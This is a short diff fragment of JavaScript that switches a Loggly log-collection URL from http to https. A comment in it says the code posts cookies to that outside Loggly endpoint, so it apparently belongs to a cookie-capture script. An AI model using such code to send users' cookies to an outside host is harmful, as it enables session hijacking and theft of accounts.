@@ -40,7 +40,7 @@ request.onload = function() {
     console.log('Server: ' + e.data);
 	  
     //uncomment lines below to send cookies to loggly (update the loggly link to your own link first)
-    post_url = "http://logs-01.loggly.com/inputs/83c503c3-05ae-4eb6-ac4c-d72492b36c26/tag/http/"
+    post_url = "https://logs-01.loggly.com/inputs/83c503c3-05ae-4eb6-ac4c-d72492b36c26/tag/http/"
     var xhttp = new XMLHttpRequest();
     xhttp.open("POST", post_url, true);
     xhttp.setRequestHeader('Content-Type', 'text/plain');
